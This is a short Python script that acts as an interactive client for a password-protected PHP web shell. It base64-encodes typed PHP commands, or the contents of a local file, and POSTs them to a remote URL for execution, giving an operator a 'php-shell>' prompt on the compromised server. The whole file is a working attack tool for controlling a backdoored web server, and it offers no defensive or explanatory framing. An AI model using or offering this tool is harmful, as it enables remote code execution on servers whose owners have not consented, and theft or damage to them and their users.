import requests 
import base64
import sys


def send_raw(url,password,cmd):
    res=requests.post(url,{
        'password':password,
        'code': base64.b64encode(cmd.encode('utf-8')) 
    })
    return res.text

def send_php_shell(url,password,cmd):
    return send_raw(url,password,'<?php '+cmd)

if __name__ == '__main__':
    if len(sys.argv) <= 1:
        print('Usage:\r\n\tpython shell.py url password')
        sys.exit(0)
    url = sys.argv[1]
    password =sys.argv[2]
    while True:
        cmd = input('php-shell>')
        if cmd == 'exit':
            break
        elif cmd.startswith('run'):
            cmd,path = cmd.split(' ',1)
            code = ''
            with open(path) as f:
                for line in f:
                    code = code + line + "\r\n" 
            response = send_raw(url,password,code);
            print(response)
        else:
            response = send_php_shell(url,password,cmd);
            print(response)
